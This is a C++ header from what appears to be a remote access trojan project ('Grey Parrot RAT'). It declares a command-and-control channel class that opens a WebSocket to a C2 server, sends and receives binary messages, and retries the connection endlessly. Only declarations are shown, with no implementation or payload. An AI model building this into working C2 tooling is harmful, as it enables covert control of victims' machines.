//
// Created by alsah on 05.04.23.
//

#ifndef GREY_PARROT_RAT_CORE_C2SERVER_CHANNEL_H
#define GREY_PARROT_RAT_CORE_C2SERVER_CHANNEL_H

#include "rtc/rtc.hpp"
#include <memory>
#include <future>
#include <variant>
#include <vector>
#include <chrono>

#include "ChannelState.h"


struct C2ServerChannelConfiguration {

    const std::function<void()> onClosed;
    const std::function<void()> onOpened;
    const std::function<void(std::vector<std::byte>)> onMessage;
    const std::function<void(ChannelState state, std::uint64_t)> onStateChange;

    // time in seconds
    const size_t sleepToRecover;

    /**
     * @param onClosed - called after opened connection was closed by remote host or due to network issues
     * @param onOpened - called after connection was established successfully
     * @param onMessage - called on binary message received
     * @param onStateChange - called on c2server channel changes
     * @param sleepToRecover - if failed to establish connection, sleep for set time and try again
     */
    C2ServerChannelConfiguration(
            const std::function<void()> &onClosed,
            const std::function<void()> &onOpened,
            const std::function<void(std::vector<std::byte>)> &onMessage,
            const std::function<void(ChannelState state, std::uint64_t)> &onStateChange,
            size_t sleepToRecover
    );

};


class C2ServerChannel final {

public:


    /**
     * Single constructor
     * @param config channel configuration, can not be overwritten
     */
    explicit C2ServerChannel(C2ServerChannelConfiguration config);

    /**
     *  <b>Blocking, time-taking operation ! </b> <br>
     *
     * Depends on 'recover' parameter behaves differently:
     * if false - try to connect once, return on fail;
     * if true - tries endlessly to setup connection, blocks thread
     * execution until connection will be opened; (should be called in a separate thread)
     *
     * @see C2ServerChannelConfiguration::sleepToRecover
     *
     * @param url - url
     * @param recover - recover after failure
     * @return true if connection opened successfully, false otherwise
     */
    bool open(const std::string& url, bool recover);

    /**
     * Close opened connection or stop recover process
     * @param reason - optional field specify close reason
     */
    void close(const std::string& reason = "");

    /**
     * Send message to c2server
     * @param data serialized binary data
     */
    void send(const std::vector<std::byte>& data);

    /**
     * get max message size that can be transferred
     */
    std::size_t getMaxMessageSize();

    C2ServerChannel(C2ServerChannel&) = delete;
    C2ServerChannel(const C2ServerChannel&) = delete;
    void operator = (const C2ServerChannel&) = delete;
    void operator = (C2ServerChannel) = delete;

private:

    const C2ServerChannelConfiguration config;

    std::mutex mutex;
    std::condition_variable run_cv;
    volatile bool run;

    rtc::WebSocket::Configuration wsConfig{};
    std::shared_ptr<rtc::WebSocket> ws;
    std::string url;

    std::promise<void> wsPromise;
    std::future<void> wsOpenResult;

    bool opened;


    // timestamp of last change
    std::uint64_t lastChange;
    ChannelState state;


    inline void setState(ChannelState newState);

    void setupChannelCallbacks();

    /**
     * Try to connect once, return on fail; url must be set previously
     * @return true if connection opened successfully, false otherwise
     */
    bool tryToOpen();

    /**
     * tries endlessly to setup connection, blocks thread execution until
     * connection will be opened;
     * breaks if close() function was called;
     * */
    void recoverConnection();
};

#endif //GREY_PARROT_RAT_CORE_C2SERVER_CHANNEL_H
